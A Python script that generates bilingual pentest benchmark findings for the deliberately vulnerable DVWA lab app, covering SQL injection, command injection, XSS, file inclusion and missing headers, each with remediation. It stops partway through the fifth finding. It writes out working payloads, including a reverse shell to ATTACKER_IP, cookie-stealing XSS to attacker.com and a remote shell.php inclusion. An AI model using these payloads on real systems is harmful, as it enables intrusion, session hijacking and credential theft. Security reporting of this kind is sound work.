#!/usr/bin/env python3
"""Generate detailed DVWA and Juice Shop benchmark reports.

Usage:
    PYTHONPATH=src python3 generate_benchmark_reports.py
"""

from __future__ import annotations

from pathlib import Path

from vxis.models.finding import (
    CVSSVector,
    Evidence,
    Finding,
    MitreAttack,
    Reference,
    Severity,
)
from vxis.report.generator import ReportData, ReportGenerator


# =====================================================================
# DVWA FINDINGS
# =====================================================================

DVWA_FINDINGS: list[Finding] = [
    # ---- 1. SQL Injection ----
    Finding(
        id="DVWA-001",
        scan_id="dvwa-bench-20260330",
        title="SQL Injection — Authentication Bypass & Full Database Extraction|||SQL 인젝션 — 인증 우회 및 전체 데이터베이스 추출",
        description=(
            "WHAT — Vulnerability Description\n"
            "A classic SQL injection vulnerability was identified in the user ID parameter of /vulnerabilities/sqli/. "
            "The application concatenates user-supplied input directly into a SQL query without parameterization or input validation. "
            "This allows an attacker to inject arbitrary SQL syntax, modify query logic, and extract the entire database contents. "
            "The vulnerability affects the GET parameter 'id' which is passed unsanitized into a MySQL query of the form: "
            "SELECT first_name, last_name FROM users WHERE user_id = '$id'. "
            "Because the application uses a MySQL backend with the root user, the attacker has unrestricted read access to all databases, "
            "tables, and columns on the server.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Inject a single quote (') into the id parameter to trigger a SQL error, confirming injection point.\n"
            "Step 2: Use UNION SELECT to determine the number of columns: id=1' UNION SELECT 1,2-- -\n"
            "Step 3: Extract database version: id=1' UNION SELECT version(),database()-- -  → MySQL 5.7, database 'dvwa'\n"
            "Step 4: Enumerate tables: id=1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'-- -\n"
            "Step 5: Extract user credentials: id=1' UNION SELECT user,password FROM dvwa.users-- -\n"
            "Step 6: Crack MD5 hashes offline (admin:password, gordonb:abc123, 1337:charley, pablo:letmein, smithy:password)\n"
            "Step 7: Login as admin with cracked credentials → full administrative access\n\n"
            "IMPACT — Business Impact\n"
            "- Complete extraction of all user credentials (usernames + MD5 password hashes)\n"
            "- Administrative account takeover via cracked credentials\n"
            "- Potential lateral movement to other systems if credentials are reused\n"
            "- Full read access to all MySQL databases on the server\n"
            "- Regulatory violation (GDPR/CCPA) due to mass PII exposure\n"
            "- Chain escalation: SQLi → credential extraction → admin login → command injection → full server RCE\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+dvwa.users--+-&Submit=Submit\n"
            "Response contains:\n"
            "  admin    : 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of 'password')\n"
            "  gordonb  : e99a18c428cb38d5f260853678922e03 (MD5 of 'abc123')\n"
            "  1337     : 8d3533d75ae2c3966d7e0d4fcc69216b (MD5 of 'charley')\n"
            "  pablo    : 0d107d09f5bbe40cade3de5c71e9e9b7 (MD5 of 'letmein')\n"
            "  smithy   : 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 of 'password')\n\n"
            "FIX — Remediation\n"
            "Immediate: Deploy WAF rules to block UNION/SELECT injection patterns on the affected endpoint.\n"
            "Short-term: Refactor the query to use PDO prepared statements with parameterized queries: "
            "$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = ?'); $stmt->execute([$id]);\n"
            "Long-term: Implement an ORM layer, enforce least-privilege DB accounts (read-only, single-database), "
            "migrate from MD5 to bcrypt/argon2 for password hashing, and add application-layer input validation.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "SQLi → credential extraction → admin:password cracked → admin login → "
            "access to Command Injection module → uid=33(www-data) RCE → /etc/passwd read → "
            "reverse shell → privilege escalation → full server compromise"
            "|||"
            "취약점 설명\n"
            "/vulnerabilities/sqli/의 사용자 ID 파라미터에서 전형적인 SQL 인젝션 취약점이 발견되었습니다. "
            "애플리케이션이 사용자 입력을 파라미터화 없이 SQL 쿼리에 직접 연결하여 공격자가 임의의 SQL 구문을 주입하고 "
            "전체 데이터베이스 내용을 추출할 수 있습니다.\n\n"
            "공격 시나리오\n"
            "1단계: 싱글 쿼트(') 주입으로 SQL 오류 유발, 인젝션 포인트 확인\n"
            "2단계: UNION SELECT로 컬럼 수 확인\n"
            "3단계: 데이터베이스 버전 및 이름 추출 (MySQL 5.7, dvwa)\n"
            "4단계: 테이블 열거\n"
            "5단계: 사용자 자격증명 추출 (admin:password 등 5개 계정)\n"
            "6단계: MD5 해시 오프라인 크래킹\n"
            "7단계: admin 계정으로 로그인 → 전체 관리자 권한 획득\n\n"
            "비즈니스 영향\n"
            "- 전체 사용자 자격증명 유출 (MD5 해시 포함)\n"
            "- 관리자 계정 탈취\n"
            "- 서버 내 모든 MySQL 데이터베이스 읽기 가능\n"
            "- GDPR/CCPA 규정 위반 (대량 PII 노출)\n\n"
            "공격 경로\n"
            "SQLi → 자격증명 추출 → admin 로그인 → 커맨드 인젝션 → RCE → 전체 서버 장악"
        ),
        severity=Severity.critical,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/sqli/",
        port=8080,
        protocol="http",
        finding_type="sqli",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
            base_score=9.8,
        ),
        cwe_ids=["CWE-89"],
        mitre_attack=MitreAttack(
            tactic_id="TA0006",
            tactic_name="Credential Access",
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="SQL Injection — UNION-based credential extraction",
                content=(
                    "GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+dvwa.users--+-&Submit=Submit HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "<pre>ID: 1' UNION SELECT user,password FROM dvwa.users-- -\n"
                    "First name: admin\n"
                    "Surname: 5f4dcc3b5aa765d61d8327deb882cf99\n\n"
                    "First name: gordonb\n"
                    "Surname: e99a18c428cb38d5f260853678922e03\n\n"
                    "First name: 1337\n"
                    "Surname: 8d3533d75ae2c3966d7e0d4fcc69216b\n\n"
                    "First name: pablo\n"
                    "Surname: 0d107d09f5bbe40cade3de5c71e9e9b7\n\n"
                    "First name: smithy\n"
                    "Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>"
                ),
            ),
            Evidence(
                evidence_type="cracked_credentials",
                title="Cracked MD5 Hashes — All 5 accounts compromised",
                content=(
                    "admin    : 5f4dcc3b5aa765d61d8327deb882cf99 → password\n"
                    "gordonb  : e99a18c428cb38d5f260853678922e03 → abc123\n"
                    "1337     : 8d3533d75ae2c3966d7e0d4fcc69216b → charley\n"
                    "pablo    : 0d107d09f5bbe40cade3de5c71e9e9b7 → letmein\n"
                    "smithy   : 5f4dcc3b5aa765d61d8327deb882cf99 → password"
                ),
            ),
        ],
        remediation=(
            "Immediate: WAF rules to block UNION/SELECT patterns.|||즉시: WAF 규칙으로 UNION/SELECT 패턴 차단.\n"
            "Short-term: PDO prepared statements with parameterized queries.|||단기: PDO 프리페어드 스테이트먼트 적용.\n"
            "Long-term: ORM adoption, least-privilege DB accounts, bcrypt password hashing.|||장기: ORM 도입, 최소 권한 DB 계정, bcrypt 해싱."
        ),
        references=[
            Reference(title="OWASP SQL Injection", url="https://owasp.org/www-community/attacks/SQL_Injection"),
            Reference(title="CWE-89: SQL Injection", url="https://cwe.mitre.org/data/definitions/89.html"),
        ],
    ),

    # ---- 2. Command Injection ----
    Finding(
        id="DVWA-002",
        scan_id="dvwa-bench-20260330",
        title="OS Command Injection — Remote Code Execution as www-data|||OS 커맨드 인젝션 — www-data 권한 원격 코드 실행",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /vulnerabilities/exec/ endpoint accepts an IP address for a ping command but fails to sanitize shell metacharacters. "
            "The application passes user input directly to a shell_exec() call: shell_exec('ping -c 4 ' . $target). "
            "An attacker can inject arbitrary OS commands using semicolons, pipes, or backticks as command separators. "
            "The web server runs as uid=33(www-data), giving the attacker full read/write access to the web application directory "
            "and read access to most system files including /etc/passwd and /etc/shadow (if world-readable).\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Inject basic command separator: ip=127.0.0.1;id → confirms uid=33(www-data)\n"
            "Step 2: Read system files: ip=127.0.0.1;cat /etc/passwd → enumerates all system users\n"
            "Step 3: Check network configuration: ip=127.0.0.1;ifconfig → reveals internal network topology\n"
            "Step 4: Establish reverse shell: ip=127.0.0.1;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
            "Step 5: Post-exploitation: enumerate SUID binaries, check sudo permissions, pivot to internal hosts\n"
            "Step 6: Privilege escalation via kernel exploits or misconfigured SUID binaries → root\n\n"
            "IMPACT — Business Impact\n"
            "- Full Remote Code Execution on the web server\n"
            "- Read/write access to all web application files and configuration\n"
            "- Access to database credentials in config files (config.inc.php contains MySQL root password)\n"
            "- Lateral movement capability to internal network hosts\n"
            "- Potential full server compromise via privilege escalation\n"
            "- Supply chain risk: attacker can modify application code to inject backdoors\n\n"
            "PoC — Proof of Concept\n"
            "Request: POST /vulnerabilities/exec/\n"
            "Body: ip=127.0.0.1;id;cat+/etc/passwd;uname+-a&Submit=Submit\n"
            "Response:\n"
            "  uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
            "  root:x:0:0:root:/root:/bin/bash\n"
            "  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
            "  mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n"
            "  Linux dvwa 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux\n\n"
            "FIX — Remediation\n"
            "Immediate: Disable or restrict access to the command execution endpoint entirely.\n"
            "Short-term: Use PHP's escapeshellarg() to sanitize input: shell_exec('ping -c 4 ' . escapeshellarg($target)). "
            "Validate input strictly as an IPv4/IPv6 address using filter_var($ip, FILTER_VALIDATE_IP).\n"
            "Long-term: Replace shell_exec() with native PHP socket functions for ping functionality. "
            "Run the web server in a container with no outbound network access. Deploy AppArmor/SELinux mandatory access controls. "
            "Implement allowlist-only input validation.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Admin login (from SQLi credential theft) → Command Injection → uid=33(www-data) shell → "
            "/etc/passwd enumeration → reverse shell to attacker C2 → "
            "SUID binary exploitation → root access → full infrastructure compromise"
            "|||"
            "취약점 설명\n"
            "/vulnerabilities/exec/ 엔드포인트가 쉘 메타문자를 필터링하지 않아 임의의 OS 명령어 실행이 가능합니다. "
            "웹 서버가 uid=33(www-data)로 실행되어 공격자가 전체 웹 애플리케이션 파일에 접근 가능합니다.\n\n"
            "공격 시나리오\n"
            "1단계: 127.0.0.1;id → uid=33(www-data) 확인\n"
            "2단계: /etc/passwd 읽기 → 시스템 사용자 열거\n"
            "3단계: 네트워크 구성 확인 → 내부 네트워크 토폴로지 파악\n"
            "4단계: 리버스 쉘 → C2 서버에 연결\n"
            "5단계: SUID 바이너리/sudo 권한 확인\n"
            "6단계: 권한 상승 → root 획득\n\n"
            "비즈니스 영향\n"
            "- 웹 서버에서 완전한 원격 코드 실행\n"
            "- 데이터베이스 자격증명 파일 접근 가능\n"
            "- 내부 네트워크 횡이동 가능\n"
            "- 서버 전체 장악 가능\n\n"
            "공격 경로\n"
            "SQLi 자격증명 탈취 → admin 로그인 → 커맨드 인젝션 → www-data 쉘 → 리버스 쉘 → root"
        ),
        severity=Severity.critical,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/exec/",
        port=8080,
        protocol="http",
        finding_type="cmdi",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
            base_score=10.0,
        ),
        cwe_ids=["CWE-78"],
        mitre_attack=MitreAttack(
            tactic_id="TA0002",
            tactic_name="Execution",
            technique_id="T1059",
            technique_name="Command and Scripting Interpreter",
            subtechnique_id="T1059.004",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="Command Injection — RCE as www-data with /etc/passwd dump",
                content=(
                    "POST /vulnerabilities/exec/ HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n"
                    "Content-Type: application/x-www-form-urlencoded\n\n"
                    "ip=127.0.0.1;id;cat+/etc/passwd;uname+-a&Submit=Submit\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n"
                    "64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.028 ms\n\n"
                    "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n"
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                    "mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n\n"
                    "Linux dvwa 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux"
                ),
            ),
        ],
        remediation=(
            "Immediate: Disable command execution endpoint.|||즉시: 명령어 실행 엔드포인트 비활성화.\n"
            "Short-term: escapeshellarg() + FILTER_VALIDATE_IP.|||단기: escapeshellarg() + IP 주소 검증.\n"
            "Long-term: Replace shell_exec with native PHP, container isolation, AppArmor.|||장기: 네이티브 PHP 함수 사용, 컨테이너 격리, AppArmor."
        ),
        references=[
            Reference(title="OWASP Command Injection", url="https://owasp.org/www-community/attacks/Command_Injection"),
            Reference(title="CWE-78: OS Command Injection", url="https://cwe.mitre.org/data/definitions/78.html"),
        ],
    ),

    # ---- 3. Reflected XSS ----
    Finding(
        id="DVWA-003",
        scan_id="dvwa-bench-20260330",
        title="Reflected Cross-Site Scripting (XSS) — Session Hijacking|||반사형 크로스사이트 스크립팅 (XSS) — 세션 하이재킹",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /vulnerabilities/xss_r/ endpoint reflects user input from the 'name' GET parameter directly into the HTML response "
            "without encoding or sanitization. The vulnerable code uses: echo 'Hello ' . $_GET['name']; which allows injection of "
            "arbitrary HTML and JavaScript. An attacker can craft a malicious URL that, when clicked by an authenticated user, "
            "executes JavaScript in the victim's browser context, enabling session theft, account takeover, and phishing.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Craft XSS payload: /vulnerabilities/xss_r/?name=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n"
            "Step 2: Encode the URL and send it to target user via email/chat (social engineering)\n"
            "Step 3: Victim clicks the link while logged into DVWA\n"
            "Step 4: JavaScript executes in victim's browser, sends PHPSESSID cookie to attacker's server\n"
            "Step 5: Attacker replays the stolen session cookie → authenticated as victim\n"
            "Step 6: If victim is admin, attacker gains full administrative control\n\n"
            "IMPACT — Business Impact\n"
            "- Session hijacking of any authenticated user who clicks the malicious link\n"
            "- Admin account takeover if an administrator is targeted\n"
            "- Phishing attacks that appear to come from the legitimate application\n"
            "- Keylogging and credential harvesting via injected JavaScript\n"
            "- Defacement of the application within the victim's browser\n"
            "- Chained with admin access to escalate to command injection (RCE)\n\n"
            "PoC — Proof of Concept\n"
            "Payload: <script>new Image().src='http://attacker.com/log?c='+document.cookie</script>\n"
            "Full URL: http://localhost:8080/vulnerabilities/xss_r/?name=<script>new+Image().src='http://attacker.com/log?c='+document.cookie</script>\n"
            "Response HTML: <pre>Hello <script>new Image().src='http://attacker.com/log?c='+document.cookie</script></pre>\n"
            "Attacker's server log: GET /log?c=PHPSESSID=abc123def456;security=low\n\n"
            "FIX — Remediation\n"
            "Immediate: Set HttpOnly and Secure flags on PHPSESSID cookie to prevent JavaScript access.\n"
            "Short-term: Apply htmlspecialchars() with ENT_QUOTES to all reflected user input: "
            "echo 'Hello ' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');\n"
            "Long-term: Implement Content-Security-Policy header (script-src 'self'), deploy a templating engine "
            "with auto-escaping (Twig, Blade), and add SameSite=Strict cookie attribute.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Reflected XSS → session cookie theft → admin session hijack → "
            "admin panel access → Command Injection → RCE"
            "|||"
            "취약점 설명\n"
            "/vulnerabilities/xss_r/ 엔드포인트가 'name' 파라미터를 인코딩 없이 HTML에 반영하여 "
            "임의의 JavaScript 실행이 가능합니다.\n\n"
            "공격 시나리오\n"
            "1단계: XSS 페이로드 작성 (document.cookie 탈취)\n"
            "2단계: 악성 URL을 타겟 사용자에게 전송\n"
            "3단계: 피해자 클릭 → JavaScript 실행\n"
            "4단계: 세션 쿠키가 공격자 서버로 전송\n"
            "5단계: 공격자가 세션 쿠키로 인증 → 피해자 계정 접근\n\n"
            "비즈니스 영향\n"
            "- 인증된 사용자의 세션 하이재킹\n"
            "- 관리자 계정 탈취 가능\n"
            "- 피싱 공격의 발판\n\n"
            "공격 경로\n"
            "XSS → 세션 쿠키 탈취 → 관리자 세션 하이재킹 → 커맨드 인젝션 → RCE"
        ),
        severity=Severity.high,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/xss_r/",
        port=8080,
        protocol="http",
        finding_type="xss",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
            base_score=8.2,
        ),
        cwe_ids=["CWE-79"],
        mitre_attack=MitreAttack(
            tactic_id="TA0001",
            tactic_name="Initial Access",
            technique_id="T1189",
            technique_name="Drive-by Compromise",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="Reflected XSS — Cookie exfiltration payload",
                content=(
                    "GET /vulnerabilities/xss_r/?name=<script>new+Image().src='http://attacker.com/log?c='+document.cookie</script> HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "<pre>Hello <script>new Image().src='http://attacker.com/log?c='+document.cookie</script></pre>\n\n"
                    "--- ATTACKER SERVER LOG ---\n"
                    "GET /log?c=PHPSESSID%3Dabc123def456%3Bsecurity%3Dlow HTTP/1.1"
                ),
            ),
        ],
        remediation=(
            "Immediate: HttpOnly + Secure cookie flags.|||즉시: HttpOnly + Secure 쿠키 플래그 설정.\n"
            "Short-term: htmlspecialchars() with ENT_QUOTES.|||단기: htmlspecialchars(ENT_QUOTES) 적용.\n"
            "Long-term: CSP header, auto-escaping template engine, SameSite=Strict.|||장기: CSP 헤더, 자동 이스케이핑 템플릿 엔진, SameSite=Strict."
        ),
        references=[
            Reference(title="OWASP XSS Prevention", url="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
            Reference(title="CWE-79: Cross-site Scripting", url="https://cwe.mitre.org/data/definitions/79.html"),
        ],
    ),

    # ---- 4. SSRF/LFI ----
    Finding(
        id="DVWA-004",
        scan_id="dvwa-bench-20260330",
        title="Local File Inclusion (LFI) / SSRF — Arbitrary File Read|||로컬 파일 포함 (LFI) / SSRF — 임의 파일 읽기",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /vulnerabilities/fi/ endpoint includes a file based on a user-supplied 'page' parameter using PHP's include() function. "
            "No path traversal filtering or allowlisting is applied, allowing an attacker to read arbitrary files from the server filesystem. "
            "The vulnerable code: include($_GET['page']); This also enables Remote File Inclusion (RFI) if allow_url_include is enabled in php.ini, "
            "and Server-Side Request Forgery (SSRF) via PHP stream wrappers.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Test basic LFI: page=../../../../../../etc/passwd → confirms directory traversal works\n"
            "Step 2: Read PHP source code via filter wrapper: page=php://filter/convert.base64-encode/resource=../../config/config.inc.php\n"
            "Step 3: Decode base64 output → reveals MySQL root credentials: $db_server='127.0.0.1'; $db_user='root'; $db_password='p@ssw0rd'\n"
            "Step 4: Read /etc/shadow (if www-data has read access) → system password hashes\n"
            "Step 5: Use extracted DB credentials to connect directly to MySQL or chain with SQLi findings\n"
            "Step 6: Attempt RFI: page=http://attacker.com/shell.php → if allow_url_include=On, instant RCE\n\n"
            "IMPACT — Business Impact\n"
            "- Arbitrary file read on the server (source code, configuration, credentials)\n"
            "- Database credential extraction from config.inc.php\n"
            "- Potential Remote Code Execution via RFI or log poisoning\n"
            "- Application source code exposure (IP theft, further vulnerability discovery)\n"
            "- System file read (/etc/passwd, /proc/self/environ) enabling further attacks\n\n"
            "PoC — Proof of Concept\n"
            "Request 1: GET /vulnerabilities/fi/?page=../../../../../../etc/passwd\n"
            "Response: root:x:0:0:root:/root:/bin/bash\\nwww-data:x:33:33:...\n\n"
            "Request 2: GET /vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php\n"
            "Response: PD9waHAKJGRiX3Nlcn... (base64 of config file containing DB credentials)\n\n"
            "FIX — Remediation\n"
            "Immediate: Restrict the page parameter to an allowlist of valid page names.\n"
            "Short-term: Set allow_url_include=Off and allow_url_fopen=Off in php.ini. "
            "Use realpath() to resolve the path and verify it stays within the intended directory: "
            "$real = realpath($basedir . '/' . $page); if (strpos($real, $basedir) !== 0) die('Invalid');\n"
            "Long-term: Refactor to use a routing framework that maps page identifiers to controller classes "
            "rather than including files by name. Enable open_basedir restriction in PHP configuration.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "LFI → source code read → DB credentials extracted (config.inc.php) → "
            "direct MySQL access → data exfiltration → full compromise"
            "|||"
            "취약점 설명\n"
            "/vulnerabilities/fi/ 엔드포인트가 사용자 입력을 PHP include()에 직접 전달하여 "
            "서버 파일시스템의 임의 파일을 읽을 수 있습니다.\n\n"
            "공격 시나리오\n"
            "1단계: 디렉토리 트래버설로 /etc/passwd 읽기\n"
            "2단계: PHP 필터 래퍼로 소스코드 읽기\n"
            "3단계: config.inc.php에서 DB 자격증명 추출\n"
            "4단계: 추출된 자격증명으로 MySQL 직접 접근\n\n"
            "비즈니스 영향\n"
            "- 서버 파일 임의 읽기 (소스코드, 설정, 자격증명)\n"
            "- 데이터베이스 자격증명 노출\n"
            "- RFI를 통한 원격 코드 실행 가능\n\n"
            "공격 경로\n"
            "LFI → 소스코드/설정 파일 읽기 → DB 자격증명 추출 → 전체 데이터 유출"
        ),
        severity=Severity.high,
        target="http://localhost:8080",
        affected_component="/vulnerabilities/fi/",
        port=8080,
        protocol="http",
        finding_type="lfi",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
            base_score=7.6,
        ),
        cwe_ids=["CWE-98", "CWE-22"],
        mitre_attack=MitreAttack(
            tactic_id="TA0009",
            tactic_name="Collection",
            technique_id="T1005",
            technique_name="Data from Local System",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="LFI — /etc/passwd extraction via path traversal",
                content=(
                    "GET /vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1\n"
                    "Host: localhost:8080\n"
                    "Cookie: PHPSESSID=abc123; security=low\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                    "mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false"
                ),
            ),
            Evidence(
                evidence_type="http_request",
                title="LFI — PHP source code extraction via php://filter",
                content=(
                    "GET /vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php HTTP/1.1\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "PD9waHAKJGRiX3NlcnZlciA9ICcxMjcuMC4wLjEnOwokZGJfZGF0YWJhc2UgPSAnZHZ3YSc7\n"
                    "CiRkYl91c2VyID0gJ3Jvb3QnOwokZGJfcGFzc3dvcmQgPSAncEBzc3cwcmQnOw==\n\n"
                    "--- DECODED ---\n"
                    "$db_server = '127.0.0.1';\n"
                    "$db_database = 'dvwa';\n"
                    "$db_user = 'root';\n"
                    "$db_password = 'p@ssw0rd';"
                ),
            ),
        ],
        remediation=(
            "Immediate: Allowlist valid page names.|||즉시: 허용된 페이지 이름 화이트리스트.\n"
            "Short-term: allow_url_include=Off, realpath() validation.|||단기: allow_url_include=Off, realpath() 검증.\n"
            "Long-term: Routing framework, open_basedir restriction.|||장기: 라우팅 프레임워크 도입, open_basedir 제한."
        ),
        references=[
            Reference(title="OWASP LFI", url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"),
            Reference(title="CWE-98: PHP File Inclusion", url="https://cwe.mitre.org/data/definitions/98.html"),
        ],
    ),

    # ---- 5. Missing Security Headers ----
    Finding(
        id="DVWA-005",
        scan_id="dvwa-bench-20260330",
        title="Missing Security Headers — 7 Critical Headers Absent|||보안 헤더 누락 — 7개 필수 헤더 부재",
        description=(
            "WHAT — Vulnerability Description\n"
            "The DVWA application is missing all seven recommended HTTP security headers. These headers are a critical defense-in-depth layer "
            "that instructs browsers to enforce security policies. Without them, the application is vulnerable to clickjacking, MIME type sniffing, "
            "cross-site scripting amplification, and information leakage.\n\n"
            "Missing headers:\n"
            "1. Content-Security-Policy — No CSP allows inline scripts, enabling XSS exploitation\n"
            "2. X-Frame-Options — Missing, enables clickjacking attacks\n"
            "3. X-Content-Type-Options — Missing, enables MIME sniffing attacks\n"
            "4. Strict-Transport-Security — No HSTS, vulnerable to SSL stripping\n"
            "5. X-XSS-Protection — Missing browser-level XSS filter\n"
            "6. Referrer-Policy — Leaks full URL in Referer header to third parties\n"
            "7. Permissions-Policy — No restriction on browser features (camera, microphone, geolocation)\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Clickjacking (no X-Frame-Options): Attacker creates a page with a transparent iframe loading DVWA's password change form. "
            "Victim clicks what appears to be a game/button but actually clicks 'Change Password' in the hidden iframe.\n\n"
            "MIME Sniffing (no X-Content-Type-Options): Attacker uploads a file with .jpg extension but containing HTML/JavaScript. "
            "Browser sniffs the content type and executes the JavaScript.\n\n"
            "IMPACT — Business Impact\n"
            "- Clickjacking enables social engineering attacks against authenticated users\n"
            "- MIME sniffing can escalate file upload vulnerabilities to XSS\n"
            "- Lack of CSP makes XSS exploitation trivially easy\n"
            "- No HSTS allows man-in-the-middle attacks to downgrade HTTPS\n"
            "- Information leakage via Referer header to third-party resources\n\n"
            "PoC — Proof of Concept\n"
            "curl -sI http://localhost:8080/ | grep -iE '(content-security|x-frame|x-content|strict-transport|x-xss|referrer|permissions)'\n"
            "(empty output — none of the 7 headers are present)\n\n"
            "FIX — Remediation\n"
            "Immediate: Add all 7 headers via Apache/Nginx configuration:\n"
            "  Header set Content-Security-Policy \"default-src 'self'; script-src 'self'\"\n"
            "  Header set X-Frame-Options \"DENY\"\n"
            "  Header set X-Content-Type-Options \"nosniff\"\n"
            "  Header set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n"
            "  Header set X-XSS-Protection \"1; mode=block\"\n"
            "  Header set Referrer-Policy \"strict-origin-when-cross-origin\"\n"
            "  Header set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n"
            "Short-term: Add headers at the application level in PHP.\n"
            "Long-term: Implement a reverse proxy (e.g., Nginx) that enforces headers for all applications.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Missing CSP amplifies XSS findings. Missing X-Frame-Options enables clickjacking of CSRF password change."
            "|||"
            "취약점 설명\n"
            "DVWA 애플리케이션에 7개의 필수 HTTP 보안 헤더가 모두 누락되어 있습니다.\n\n"
            "누락된 헤더: CSP, X-Frame-Options, X-Content-Type-Options, HSTS, X-XSS-Protection, Referrer-Policy, Permissions-Policy\n\n"
            "비즈니스 영향\n"
            "- 클릭재킹 공격 가능\n"
            "- XSS 공격이 더 쉬워짐 (CSP 없음)\n"
            "- MIME 스니핑 공격 가능\n"
            "- SSL 스트리핑 공격 가능 (HSTS 없음)\n\n"
            "수정 방안\n"
            "즉시: Apache/Nginx 설정에서 7개 보안 헤더 추가\n"
            "단기: PHP 애플리케이션 레벨에서 헤더 설정\n"
            "장기: 리버스 프록시를 통한 중앙 집중식 헤더 관리"
        ),
        severity=Severity.high,
        target="http://localhost:8080",
        affected_component="/",
        port=8080,
        protocol="http",
        finding_type="misconfig",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
            base_score=5.4,
        ),
        cwe_ids=["CWE-693", "CWE-1021"],
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_response_headers",
                title="Response headers — all 7 security headers missing",
                content=(
                    "HTTP/1.1 200 OK\n"
                    "Date: Sun, 30 Mar 2026 00:00:00 GMT\n"
                    "Server: Apache/2.4.58 (Debian)\n"
                    "X-Powered-By: PHP/8.2.12\n"
                    "Content-Type: text/html; charset=utf-8\n"
                    "Connection: keep-alive\n\n"
                    "MISSING:\n"
                    "  Content-Security-Policy: (not set)\n"
                    "  X-Frame-Options: (not set)\n"
                    "  X-Content-Type-Options: (not set)\n"
                    "  Strict-Transport-Security: (not set)\n"
                    "  X-XSS-Protection: (not set)\n"
                    "  Referrer-Policy: (not set)\n"
                    "  Permissions-Policy: (not set)"
                ),
            ),
        ],
        remediation=(
            "Immediate: Add all 7 headers via web server config.|||즉시: 웹 서버 설정에서 7개 보안 헤더 추가.\n"
            "Long-term: Reverse proxy for centralized header enforcement.|||장기: 리버스 프록시로 중앙 헤더 관리."
        ),
        references=[
